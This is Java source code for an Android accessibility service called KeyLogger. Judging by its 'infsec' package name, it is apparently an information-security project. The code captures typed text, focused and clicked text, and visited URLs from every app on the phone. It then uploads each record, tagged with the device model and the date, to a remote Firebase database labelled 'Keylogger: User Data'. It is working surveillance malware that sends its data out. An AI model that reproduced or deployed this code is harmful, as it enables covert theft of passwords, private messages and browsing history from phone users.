package com.maemresen.infsec.keylogapp;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.maemresen.infsec.keylogapp.model.KeyLog;
import com.maemresen.infsec.keylogapp.util.DateTimeHelper;
import com.maemresen.infsec.keylogapp.util.Helper;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.Locale;
import java.util.Map;

public class KeyLogger extends AccessibilityService {
    
    private final static String LOG_TAG = Helper.getLogTag( KeyLogger.class );
    private BadWordDetector badWordDetector;
    
    @Override
    public void onServiceConnected() {
        Log.i( LOG_TAG, "Starting service" );
        badWordDetector = new BadWordDetector();
    }
    
    @Override
    public void onAccessibilityEvent( AccessibilityEvent event ) {
        // so this project completely depends on accessibility Events of the phone
        //please refer this website https://developer.android.com/reference/android/view/accessibility/AccessibilityEvent
        
        String uuid = Helper.getUuid();
        Date now = DateTimeHelper.getCurrentDay();
        String accessibilityEvent = null;
        String msg = null;
        
        SimpleDateFormat dateFormat = new SimpleDateFormat( "dd-MM-yyyy", Locale.getDefault() );
        String databaseName = dateFormat.format( now );
        
        
        /*
        AccessibilityEvent.TYPE_VIEW_CLICKED: Triggered when a view is clicked.
        AccessibilityEvent.TYPE_VIEW_LONG_CLICKED: Triggered when a view is long-clicked.
        AccessibilityEvent.TYPE_VIEW_SELECTED: Triggered when a view is selected.
        AccessibilityEvent.TYPE_VIEW_FOCUSED: Triggered when a view receives focus.
        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: Triggered when the text content of a view changes.
        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: Triggered when the state of a window changes.
        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: Triggered when the state of a notification changes.
        AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START: Triggered when a touch exploration gesture starts.
        AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END: Triggered when a touch exploration gesture ends.
        AccessibilityEvent.TYPE_VIEW_HOVER_ENTER: Triggered when a view is being hovered over.
        * */
        
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                accessibilityEvent = "TYPE_VIEW_TEXT_CHANGED";
                msg = String.valueOf( event.getText() );
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                accessibilityEvent = "TYPE_VIEW_FOCUSED";
                msg = String.valueOf( event.getText() );
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                accessibilityEvent = "TYPE_VIEW_CLICKED";
                msg = String.valueOf( event.getText() );
                break;
            }
            default:
        }
        
        if (accessibilityEvent == null) {
            return;
        }
        
        Log.i( LOG_TAG, msg );
        
        String packageName = event.getPackageName().toString();
        String ownerName = Build.MODEL;
        
        KeyLog keyLog = new KeyLog();
        keyLog.setUuid( uuid );
        keyLog.setKeyLogDate( now );
        keyLog.setAccessibilityEvent( accessibilityEvent );
        keyLog.setMsg( msg );
        
        
        // Check if it's a keyboard click event
        CharSequence classNameCs = event.getClassName();
        String className = classNameCs.toString();
        if (className.contains( "EditText" ) || className.contains( "Input" )) {
            DatabaseReference logdata = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                    .child( ownerName )
                    .child( databaseName )
                    .child( "Text Records" );
            logdata.push().setValue( keyLog );
        } else if (msg != null && Helper.isURL( msg )) {
            DatabaseReference urlData = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                    .child( ownerName )
                    .child( databaseName )
                    .child( "URL Visits" );
            urlData.push().setValue( keyLog );
        } else {
            DatabaseReference logdata = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                    .child( ownerName )
                    .child( databaseName )
                    .child( "All Records" );
            logdata.push().setValue( keyLog );
        }
        
        
    
        // Check if any bad word is typed by the user and perform screen shot operation event
        if (badWordDetector.containsBadWord( msg )) {
            Log.d( LOG_TAG, "Bad word detected: " + msg + " in UUID: " + uuid );
        
        }
        
    }
    
    private Map<String, String> getMap( KeyLog keyLog ) throws IllegalAccessException {
        Map<String, String> result = new LinkedHashMap<>();
        result.put( "uuid", keyLog.getUuid() );
        result.put( "keyLogDate", DateTimeHelper.getTheDateInString( keyLog.getKeyLogDate() ) );
        result.put( "accessibilityEvent", keyLog.getAccessibilityEvent() );
        result.put( "msg", keyLog.getMsg() );
        return result;
    }
    
    @Override
    public void onInterrupt() {
    
    }
}